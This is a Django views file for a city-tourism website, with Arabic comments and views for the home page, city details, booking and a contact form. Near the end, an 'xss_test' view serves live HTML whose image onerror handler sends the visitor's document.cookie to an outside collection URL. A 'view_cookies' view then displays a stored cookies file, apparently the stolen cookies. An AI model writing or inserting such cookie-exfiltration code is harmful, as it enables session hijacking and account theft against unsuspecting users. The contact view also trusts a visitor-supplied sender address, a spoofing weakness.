from django.shortcuts import render, get_object_or_404
from .models import City

# عرض أول 6 مدن فقط
def home(request):
    cities = City.objects.all()[:6]  # جلب أول 6 مدن
    return render(request, 'home.html', {'cities': cities})

# عرض تفاصيل المدينة مع المعارض
def city_detail(request, city_id):
    city = get_object_or_404(City, pk=city_id)
    images = city.gallery.all()  # افترض أن لديك علاقة مع نموذج الصور هنا
    return render(request, 'city_detail.html', {'city': city, 'images': images})

# صفحة الحجز
def booking(request):
    return render(request, 'booking.html')

# صفحة الاتصال
from django.core.mail import send_mail
from django.shortcuts import render, redirect
from .models import ContactMessage

def contact(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        message = request.POST.get('message')

        # حفظ في قاعدة البيانات
        ContactMessage.objects.create(name=name, email=email, message=message)

        # إرسال إيميل
        send_mail(
            subject=f'New Contact Message from {name}',
            message=message,
            from_email=email,
            recipient_list=['oboulechfar1@gmail.com'],  # غيرها لإيميلك
            fail_silently=False,
        )

        return render(request, 'contact.html', {'success': True})

    return render(request, 'contact.html')

from django.http import HttpResponse

def xss_test(request):
    return HttpResponse("""
        <html>
        <body>
        <h1>XSS Test</h1>
        <img src="x" onerror="fetch('https://usaau.com/collect/?cookie='+document.cookie)">
        </body>
        </html>
    """)
def view_cookies(request):
    with open("cookies.txt", "r") as f:
        content = f.read()
    return HttpResponse(f"<pre>{content}</pre>")

